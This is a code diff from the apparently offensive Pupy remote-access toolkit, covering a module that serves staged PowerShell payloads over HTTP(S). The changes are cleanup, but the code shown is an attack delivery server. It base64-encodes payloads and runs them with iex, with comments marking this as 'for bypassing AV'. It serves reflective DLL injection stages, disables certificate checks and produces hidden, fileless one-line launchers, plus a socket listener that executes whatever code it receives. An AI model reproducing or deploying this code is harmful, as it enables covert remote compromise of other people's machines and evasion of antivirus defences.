@@ -2,19 +2,14 @@
 # -*- coding: utf-8 -*-
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from SocketServer import ThreadingMixIn
-from pupygen import generate_binary_from_template
 from pupylib.PupyCredentials import Credentials
-from pupylib.PupyConfig import PupyConfig
 from pupylib.utils.term import colorize
 from base64 import b64encode
 from ssl import wrap_socket
-import random
-import string
 import tempfile
 import os.path
 import pupygen
 import ssl
-import re
 import socket
 
 # "url_random_one" and "url_random_two_x*" variables are fixed because if you break you ps1_listener, the ps1_listener payload will not be able to get stages -:(
@@ -33,11 +28,11 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
         self.sys_version    = ""
 
         if self.path == "/%s" % url_random_one:
-            
+
             self.send_response(200)
             self.send_header('Content-type','text/html')
             self.end_headers()
-            
+
             # Send stage 1 to target
             self.wfile.write(self.server.stage1)
             print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"
@@ -46,15 +41,15 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type','text/html')
             self.end_headers()
-            
+
             stage2 = None
-            if self.path == "/%s" % url_random_two_x86: 
+            if self.path == "/%s" % url_random_two_x86:
                 print colorize("[+] ","green") + "remote script is running in a x86 powershell process"
                 stage2 = self.server.stage2_x86
             else:
                 print colorize("[+] ","green") + "remote script is running in a x64 powershell process"
                 stage2 = self.server.stage2_x64
-            
+
             # Send stage 2 to target
             self.wfile.write(stage2)
             print colorize("[+] ","green") + "[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!"
@@ -100,7 +95,7 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
 
 def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True, nothidden=False):
     try:
-        
+
         protocol             = 'http'
         ssl_cert_validation  = ''
         not_use_target_proxy = ''
@@ -112,7 +107,7 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
         if sslEnabled:
             protocol            = 'https'
             ssl_cert_validation = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
-        
+
         if not useTargetProxy:
             not_use_target_proxy = '$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();'
 
@@ -140,29 +135,25 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
         launcher_x86 = powershell.replace('[RANDOM]', url_random_two_x86)
 
         stage1 = ps_template_stage1.format(launcher_x64, launcher_x86)
-        
+
         # For bypassing AV
         stage1 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage1))
-        
+
         # generate both pupy dll to gain time response
         print colorize("Generating puppy dll to gain server reaction time. Be patient...", "red")
         tmpfile    = tempfile.gettempdir()
         output_x86 = pupygen.generate_ps1(conf, output_dir=tmpfile, x86=True)
         output_x64 = pupygen.generate_ps1(conf, output_dir=tmpfile, x64=True)
-        
+
         stage2_x86 = open(output_x86).read()
         stage2_x64 = open(output_x64).read()
-        
+
         # For bypassing AV
         stage2_x86 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x86))
         stage2_x64 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x64))
-        
-        try:
-            server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
-            server.set(conf, sslEnabled, stage1, stage2_x86, stage2_x64)
-        except Exception as e:
-            # [Errno 98] Adress already in use
-            raise
+
+        server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
+        server.set(conf, sslEnabled, stage1, stage2_x86, stage2_x64)
 
         print colorize("[+] ","green")+"copy/paste one of these one-line loader to deploy pupy without writing on the disk :"
         print " --- "
@@ -179,11 +170,11 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
     except KeyboardInterrupt:
         print 'KeyboardInterrupt received, shutting down the web server'
         server.server_close()
-        
+
         # clean local file created
         os.remove(output_x86)
         os.remove(output_x64)
-        
+
         exit()
 
 def send_ps1_payload(conf, bind_port, target_ip, nothidden=False):
@@ -191,12 +182,11 @@ def send_ps1_payload(conf, bind_port, target_ip, nothidden=False):
     [byte[]]$b=0..4096|%{0};$t.Read($b, 0, 4);$c="";
     if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){$t.Write([System.Text.Encoding]::UTF8.GetBytes("2"),0,1);}
     else{$t.Write([System.Text.Encoding]::UTF8.GetBytes("1"),0,1);}
-    while(($i=$t.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$c=$c+$d; } 
-    $t.Close();$l.stop();iex $c; 
-    """    
+    while(($i=$t.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$c=$c+$d; }
+    $t.Close();$l.stop();iex $c;
+    """
     main_ps1_template = """$c=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $c;"""
-    hidden               = '-w hidden '
-    if nothidden: hidden = ''
+    hidden               = '' if nothidden else '-w hidden '
     launcher             = ps1_template.replace("[BIND_PORT]",bind_port)
     launcher             = launcher.replace('\n','').replace('    ','')
     basic_launcher       = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
